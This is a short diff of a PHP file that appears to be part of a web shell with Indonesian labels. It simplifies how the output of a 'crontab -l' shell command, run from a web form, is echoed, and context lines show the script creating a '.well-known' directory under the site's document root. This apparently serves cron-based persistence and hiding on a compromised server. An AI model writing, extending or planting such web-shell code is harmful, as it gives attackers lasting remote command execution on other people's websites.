@@ -7,16 +7,7 @@
 		<input  class = 'form-control col-md-4' style='width:250px; height:40px; 'type='submit' name='hapus' value='Hapus!'>
 	
 		</form><hr><br></center>";
-			if ($_POST['list']) {
-			$output=null;
-			
-			Execute('crontab -l', $output);
-			echo "<ol>";
-			foreach ($output as $key){
-    			echo "<li>".$key."</li>";
-			}
-			echo "<li>=================================================</li></ol>";
-				}
+			if ($_POST['list']) { echo(Execute("crontab -l")); }
 
 			if ($_POST['go']) {
 					if (!is_dir($_SERVER['DOCUMENT_ROOT'].'/.well-known/')) { mkdir($_SERVER['DOCUMENT_ROOT'].'/.well-known/', 0755, true); }
